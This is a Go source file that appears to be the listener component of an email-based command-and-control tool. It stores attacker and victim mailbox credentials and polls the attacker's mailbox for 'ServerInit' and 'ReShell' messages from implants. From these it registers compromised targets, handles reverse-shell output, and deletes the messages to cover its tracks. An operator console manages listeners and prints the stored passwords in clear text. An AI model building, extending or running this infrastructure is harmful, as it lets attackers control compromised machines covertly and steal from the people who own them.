package main

import (
	"database/sql"
	"fmt"
	"log"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"github.com/go-playground/validator"
)

type Listener struct {
	Id               string `validate:"required"`
	Name             string `validate:"required"`
	Attacker         string `validate:"required"`
	AttackerPassword string `validate:"required"`
	AttackerUrl      string `validate:"required"`
	AttackerDomain   string `validate:"required"`
	Victim           string `validate:"required"`
	VictimPassword   string `validate:"required"`
	VictimUrl        string `validate:"required"`
	VictimDomain     string `validate:"required"`
	Key              string `validate:"required"`
	stop             chan bool
	IsStopped        bool
}

var listeners = []Listener{}

// var channelListener chan []Listener
var src = rand.NewSource(time.Now().UnixNano())

const (
	letterIdxBits = 6
	letterIdxMask = 1<<letterIdxBits - 1
	letterIdxMax  = 63 / letterIdxBits
)

const letterBytes = "0123456789abcdef"

func RandStringBytesMaskImprSrcUnsafe(n int) string {
	b := make([]byte, n)
	for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			b[i] = letterBytes[idx]
			i--
		}
		cache >>= letterIdxBits
		remain--
	}

	return *(*string)(unsafe.Pointer(&b))
}

// func ListenerAddTarget(IdListener, IdTarget, Key string) {
// 	if err != nil {
// 		return
// 	}
// 	for _, emailID := range emailIDs {
// 		_, subject, body, isRead, changeKey, err := getEmailContent(emailID)
// 		if err != nil || isRead {
// 			continue
// 		}
// 		switch subject {
// 		case "ServerInit:" + IdListener:
// 			data = decrypt(body, key)
// 		}
// 	}
// }

func ListenerRun(db *sql.DB, stop chan bool, listener *Listener) {
	logFile, err := os.OpenFile("log/listener/"+listener.Id+".txt", os.O_CREATE|os.O_APPEND|os.O_RDWR, 0644)
	if err != nil {
		log.Fatalln(err)
	}
	// log.SetOutput(logFile)
	CustomLogger := log.New(logFile, "", 0)
	for {
		select {
		case <-stop:
			return
		default:
			time.Sleep(time.Second * 3)
			emailIDs, err := receiveEmails(listener.AttackerUrl, listener.Attacker, listener.AttackerPassword, "Subject:\"ServerInit:"+listener.Id+"\"")
			if err != nil {
				CustomLogger.Println(err)
			} else {
				for _, emailID := range emailIDs {
					_, _, body, isRead, _, err := getEmailContent(listener.AttackerUrl, listener.Attacker, listener.AttackerPassword, emailID)
					if err != nil || isRead {
						continue
					}
					body = strings.Trim(strings.Replace(body, "&#xD;", "", -1), "\r\n")

					s := strings.Split(body, "#")
					if len(s) == 4 {
						TargetCreate(db, s[0], s[1], s[2], s[3], listener)
						deleteEmail(listener.AttackerUrl, listener.Attacker, listener.AttackerPassword, emailID)
					} else {
						CustomLogger.Println("ServerInit: Not enough email content: ", body)
						deleteEmail(listener.AttackerUrl, listener.Attacker, listener.AttackerPassword, emailID)
					}

					// data = decrypt(body, listener.Key)
				}
			}

			emailIDs, err = receiveEmails(listener.AttackerUrl, listener.Attacker, listener.AttackerPassword, "Subject:\"ReShell:"+listener.Id+"\"")
			if err != nil {
				CustomLogger.Println(err)
			} else {
				for _, emailID := range emailIDs {
					_, _, body, isRead, _, err := getEmailContent(listener.AttackerUrl, listener.Attacker, listener.AttackerPassword, emailID)
					if err != nil || isRead {
						continue
					}
					body = strings.Trim(strings.Replace(body, "&#xD;", "", -1), "\r\n")
					s := strings.Split(body, "#")
					if len(s) == 3 {
						TargetParseBody(s[0], s[2], listener.Key)
						deleteEmail(listener.AttackerUrl, listener.Attacker, listener.AttackerPassword, emailID)
					} else if len(s) != 2 {
						CustomLogger.Println("Shell: Not enough email content: ", body)
						deleteEmail(listener.AttackerUrl, listener.Attacker, listener.AttackerPassword, emailID)
					}
				}
			}
		}

	}
}

func ListenersInit(db *sql.DB) error {
	query, err := db.Query("SELECT * FROM listeners")
	if err != nil {
		return err
	}
	defer query.Close()

	for query.Next() {
		var listener Listener
		query.Scan(&listener.Id, &listener.Name, &listener.Attacker, &listener.AttackerPassword, &listener.AttackerUrl, &listener.AttackerDomain, &listener.Victim, &listener.VictimPassword, &listener.VictimUrl, &listener.VictimDomain, &listener.Key)
		listener.stop = make(chan bool)
		listener.IsStopped = false
		listeners = append(listeners, listener)
		go ListenerRun(db, listener.stop, &listener)
	}
	return nil
}

func ListenerInteract(db *sql.DB, prompt []string) {
	prompt = append(prompt, "listener")
	commandOptions := []CommandOption{
		{"ls", "List listener", ListenerLs},
		{"create", "Create listener", ListenerCreate},
		{"delete", "Create listener", ListenerDelete},
		{"stop", "Stop listener", ListenerStop},
		{"start", "Start listener", ListenerStart},
		{"log", "Show log listener", ListenerLog},
	}
	menuOptions := NewMenuOptions([]string{"root"}, db)
	menu := NewMenu(commandOptions, menuOptions)
	menu.SetMenuPrompt(prompt)
	menu.Start()
}

func ListenerLs(db *sql.DB, prompt []string, args ...string) error {
	for _, listener := range listeners {
		fmt.Printf("Listener %s:\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%t \n", listener.Id, listener.Name, listener.Attacker, listener.AttackerPassword, listener.AttackerUrl, listener.Victim, listener.VictimPassword, listener.VictimUrl, listener.Key, listener.IsStopped)
	}
	return nil
}

func ListenerCreate(db *sql.DB, prompt []string, args ...string) error {
	// var name, from, fromPassword, fromUrl, to, toPassword, toUrl string
	listener := Listener{
		Name:             "",
		Attacker:         "",
		AttackerPassword: "",
		AttackerUrl:      "",
		AttackerDomain:   "",
		Victim:           "",
		VictimPassword:   "",
		VictimUrl:        "",
		VictimDomain:     "",
		IsStopped:        false,
		stop:             make(chan bool),
	}
	fmt.Print("Name: ")
	fmt.Scanln(&listener.Name)
	for len(strings.Split(listener.Attacker, "\\")) != 2 || strings.Count(listener.Attacker, "\\") != 1 {
		fmt.Print("Attacker: ")
		fmt.Scanln(&listener.Attacker)
		if listener.Attacker == "exit" {
			return nil
		}
	}
	fmt.Print("AttackerPassword: ")
	fmt.Scanln(&listener.AttackerPassword)
	fmt.Print("AttackerUrl: ")
	fmt.Scanln(&listener.AttackerUrl)
	fmt.Print("AttackerDomain: ")
	fmt.Scanln(&listener.AttackerDomain)
	for len(strings.Split(listener.Victim, "\\")) != 2 || strings.Count(listener.Victim, "\\") != 1 {
		fmt.Print("Victim: ")
		fmt.Scanln(&listener.Victim)
		if listener.Victim == "exit" {
			return nil
		}
	}
	fmt.Print("VictimPassword: ")
	fmt.Scanln(&listener.VictimPassword)
	fmt.Print("VictimUrl: ")
	fmt.Scanln(&listener.VictimUrl)
	fmt.Print("VictimDomain: ")
	fmt.Scanln(&listener.VictimDomain)

	listener.Id = RandStringBytesMaskImprSrcUnsafe(12)
	listener.Key = RandStringBytesMaskImprSrcUnsafe(64)
	validate = validator.New()
	err := validate.Struct(listener)
	if err != nil {
		fmt.Println(err)
		return nil
	}
	// listener.stop = make(chan bool)
	// listener.IsStopped = false

	statement, err := db.Prepare(`INSERT INTO listeners(Id, Name, Attacker, AttackerPassword, AttackerUrl,AttackerDomain, Victim, VictimPassword, VictimUrl,VictimDomain, Key) VALUES (?,?,?,?,?,?,?,?,?,?,?)`)
	if err != nil {
		fmt.Println(err)
		return nil
	}

	_, err = statement.Exec(listener.Id, listener.Name, listener.Attacker, listener.AttackerPassword, listener.AttackerUrl, listener.AttackerDomain, listener.Victim, listener.VictimPassword, listener.VictimUrl, listener.VictimDomain, listener.Key)

	if err != nil {
		fmt.Println(err)
		return nil
	}

	go ListenerRun(db, listener.stop, &listener)
	listeners = append(listeners, listener)
	fmt.Println(">>> Success!!!")
	return nil
}

func ListenerDelete(db *sql.DB, prompt []string, args ...string) error {
	if len(args) == 0 {
		return nil
	}
	for _, arg := range args {
		for i := range listeners {
			if listeners[i].Id == arg || strconv.Itoa(i) == arg {
				if !listeners[i].IsStopped {
					listeners[i].stop <- true
				}
				statement, err := db.Prepare("DELETE FROM listeners where  Id = ?")
				if err != nil {
					fmt.Println(err)
					return nil
				}
				_, err = statement.Exec(listeners[i].Id)
				if err != nil {
					fmt.Println(err)
					return nil
				}
				fmt.Printf(">>> Success: Delete listener %s\n", listeners[i].Id)
				listeners = append(listeners[:i], listeners[i+1:]...)

			}

		}
	}

	return nil
}

func ListenerStart(db *sql.DB, prompt []string, args ...string) error {
	if len(args) == 0 {
		return nil
	}
	for _, arg := range args {
		for i := range listeners {
			if listeners[i].Id == arg || strconv.Itoa(i) == arg {
				if listeners[i].IsStopped {
					listeners[i].stop = make(chan bool)
					listeners[i].IsStopped = false
					go ListenerRun(db, listeners[i].stop, &listeners[i])
					fmt.Printf(">>> Success: Start %s \n", listeners[i].Id)
				} else {
					fmt.Printf(">>> Fail: Listener %s is running\n", listeners[i].Id)
				}
			}
		}
	}
	return nil
}

func ListenerStop(db *sql.DB, prompt []string, args ...string) error {
	if len(args) == 0 {
		return nil
	}
	for _, arg := range args {
		for i := range listeners {
			if listeners[i].Id == arg || strconv.Itoa(i) == arg {
				listeners[i].stop <- true
				listeners[i].IsStopped = true
				close(listeners[i].stop)
			}
		}
	}
	return nil
}

func ListenerLog(db *sql.DB, prompt []string, args ...string) error {
	if len(args) == 0 {
		return nil
	}
	for _, arg := range args {
		for i := range listeners {
			if listeners[i].Id == arg || strconv.Itoa(i) == arg {
				data, err := os.ReadFile("log/listener/" + listeners[i].Id + ".txt")
				if err != nil {
					fmt.Println(err)
				} else {
					fmt.Print(string(data))
				}
			}
		}
	}
	return nil
}
